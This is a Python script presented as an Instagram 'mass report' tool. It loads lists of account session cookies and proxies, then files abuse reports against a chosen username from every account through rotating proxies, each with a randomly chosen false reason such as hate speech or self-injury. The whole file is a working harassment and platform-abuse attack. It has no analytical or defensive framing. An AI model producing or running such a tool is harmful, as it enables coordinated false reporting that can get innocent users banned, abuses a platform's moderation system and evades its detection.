import requests
import random
import os
import sys


RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
RESET = "\033[0m"

def banner():

    print(f"{RED}")
    print(r"""
 (                
   (      (     (     )\ )         (   
 ( )\   ( )\    )\   (()/(   (   ( )\  
 )((_)  )((_)((((_)(  /(_))  )\  )((_) 
((_)_  ((_)_  )\ _ )\(_))_  ((_)((_)_  
 / _ \  / _ \ (_)_\(_)|   \ | __|| _ ) 
| (_) || (_) | / _ \  | |) || _| | _ \ 
 \__\_\ \__\_\/_/ \_\ |___/ |___||___/ 
    """)
    print(f"      [!] Instagram reporter QQADEB v2.0 {RESET}")

def report_account(target_id, proxy, session_cookie):

    report_reasons = ["spam", "violence", "hate_speech", "self_injury"]
    reason = random.choice(report_reasons)
    
    url = f"https://www.instagram.com/api/v1/reports/user/"
    
    headers = {
        "User-Agent": "Instagram 213.0.0.12.117 Android (26/4.4.2; 480dpi; 1080x1920; Samsung SM-G900F)",
        "X-Requested-With": "XMLHttpRequest",
        "Cookie": session_cookie,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    data = {
        "user_id": target_id,
        "reason": reason
    }
    
    proxy_dict = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    }

    try:
        response = requests.post(url, data=data, headers=headers, proxies=proxy_dict, timeout=10)
        if response.status_code == 200:
            return True
        else:
            return False
    except:
        return "proxy_dead"

def main():
    os.system('clear')
    banner()

    target_username = input(f"{YELLOW}Enter Target Username: {RESET}")
    
    cookie_file = input(f"{YELLOW}Enter Path to Cookies List: {RESET}")
    proxy_file = input(f"{YELLOW}Enter Path to Proxy List: {RESET}")

    if not os.path.exists(cookie_file) or not os.path.exists(proxy_file):
        print(f"{RED}[!] Files not found! Check your paths.{RESET}")
        return

    with open(cookie_file, 'r') as f:
        cookies = f.read().splitlines()
    with open(proxy_file, 'r') as f:
        proxies = f.read().splitlines()

    print(f"\n{GREEN}[*] Loaded {len(cookies)} accounts and {len(proxies)} proxies.")
    print(f"[*] Starting Mass Report attack on {target_username}...\n")

    success_count = 0
    for i in range(len(cookies)):
        cookie = cookies[i]
        proxy = proxies[i % len(proxies)]
        
        result = report_account(target_username, proxy, cookie)
        
        if result == True:
            success_count += 1
            print(f"{GREEN}[+] Report sent successfully from account {i+1}{RESET}")
        elif result == "proxy_dead":
            print(f"{RED}[!] Proxy {proxy} is dead. Skipping...{RESET}")
        else:
            print(f"{YELLOW}[-] Failed to report from account {i+1}{RESET}")

    print(f"\n{GREEN}--- ATTACK FINISHED ---")
    print(f"Total Successful Reports: {success_count}{RESET}")

if __name__ == "__main__":
    main()
  
